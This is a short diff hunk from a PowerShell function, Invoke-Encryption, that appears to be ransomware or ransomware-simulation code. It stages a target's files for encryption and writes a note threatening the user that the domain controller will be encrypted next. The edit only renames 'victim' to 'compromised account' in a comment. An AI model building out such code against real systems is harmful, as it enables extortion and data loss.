@@ -62,7 +62,7 @@ function Invoke-Encryption {
 
     Copy-Item "$TargetPath\*.*" -Destination $FolderToEncrypt -Exclude *.exe, *.ps1, .vs*
 
-    # create info for the victim
+    # create info for the compromised account
     $newFile = "$TargetPath\$filePrefix.txt"
     (Get-Date).toString("yyyy-MM-dd HH:mm:ss") + "  | Hi user '$env:USERNAME', next time I will encrypt the complete Domain Controller."  | Out-File -FilePath $newFile 
     Get-Item $FolderToEncrypt\*.* | Out-File -FilePath $newFile -Append
